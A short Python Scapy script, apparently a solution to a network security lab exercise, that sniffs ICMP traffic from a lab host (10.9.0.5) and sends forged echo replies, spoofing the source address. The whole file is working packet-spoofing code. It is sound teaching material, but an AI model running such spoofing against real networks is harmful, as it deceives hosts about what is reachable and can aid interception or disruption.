from scapy.all import *

def spoof_ping(pkt):

    #create ip header
    ip = IP()
    ip.src = pkt[IP].dst
    ip.dst = pkt[IP].src
    ip.ihl = pkt[IP].ihl
    #create icmp header
    icmp = ICMP()
    icmp.type = 0
    icmp.id = pkt[ICMP].id
    icmp.seq = pkt[ICMP].seq
    #load data
    data = pkt[Raw].load
    #build and send spoofed message
    p = ip/icmp/data
    send(p)
    
print("spoofing....")
#sniff only pakets of icmp and from the attacked ip address
pkt1 = sniff(iface = ['br-0338c03034a9','enp0s3'], filter = 'icmp and src 10.9.0.5', prn = spoof_ping)
    
